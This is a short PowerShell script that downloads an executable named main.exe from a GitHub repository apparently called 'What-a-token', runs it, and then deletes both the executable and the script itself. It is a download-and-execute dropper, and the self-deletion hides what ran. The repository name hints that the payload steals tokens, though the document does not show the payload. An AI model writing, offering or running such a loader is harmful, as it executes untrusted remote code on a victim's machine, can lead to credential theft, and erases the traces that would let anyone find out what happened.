$targetDirectory = "D:\Setups or somethin'"
$exeUrl = "https://github.com/AFRAID-FOR-YOU/What-a-token/raw/refs/heads/main/main.exe"
$exePath = "$targetDirectory\main.exe"
$selfPath = $MyInvocation.MyCommand.Path

# Ensure directory exists
if (-Not (Test-Path -Path $targetDirectory)) {
    Write-Host "Creating directory: $targetDirectory"
    try {
        New-Item -ItemType Directory -Path $targetDirectory -Force | Out-Null
    } catch {
        Write-Error "Failed to create directory: $_"
        exit 1
    }
}

# Download the executable
try {
    Write-Host "Downloading executable from $exeUrl..."
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
    Write-Host "Downloaded successfully to $exePath"
} catch {
    Write-Error "Failed to download: $_"
    exit 1
}

# Run the executable
try {
    Write-Host "Running the downloaded executable..."
    Start-Process -FilePath $exePath -Wait -NoNewWindow
    Write-Host "Execution completed."
} catch {
    Write-Error "Error during execution: $_"
}

# Cleanup - delete the downloaded file and then this script
try {
    Write-Host "Cleaning up..."
    if (Test-Path $exePath) {
        Remove-Item -Path $exePath -Force
    }
    
    # Delete this script
    if (Test-Path $selfPath) {
        Start-Sleep -Seconds 1
        Remove-Item -Path $selfPath -Force
    }
    Write-Host "Cleanup done."
} catch {
    Write-Error "Cleanup failed: $_"
}
